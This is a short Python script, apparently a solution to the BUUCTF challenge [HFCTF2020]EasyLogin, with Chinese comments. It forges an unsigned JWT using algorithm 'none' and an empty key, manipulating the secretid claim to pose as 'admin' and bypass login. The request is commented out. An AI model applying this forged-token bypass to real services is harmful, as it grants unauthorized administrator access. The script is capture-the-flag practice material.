import jwt
import requests


# jwt攻击方式：未校验签名、禁用哈希、暴破弱密钥。
# 题目地址：https://buuoj.cn/challenges#[HFCTF2020]EasyLogin

url = 'http://39e6f2d6-e50d-45c7-b27b-30aa17205cd1.node3.buuoj.cn/api/login'

def jisuan(reg):


                        # 此处实际上是将算法algorithm置空的方式来进行绕过，不过后端的话需要注意一下需要将secretid置为大于0的浮点数，或者为空数组即可绕过
    jwt_auth = jwt.encode({'secretid':'0.1','username':'admin','password':'{}'.format(reg),'iat':''},algorithm='none',key='').decode('utf-8')

    data = {                        
        'username':'admin',
        'password':'{passwd}'.format(passwd=reg),
        'authorization':'{auth}'.format(auth=jwt_auth)
    }
    print(data)
    # re = requests.post(url=url,data=data)
    # print('结果为：',re.text)




jisuan('123')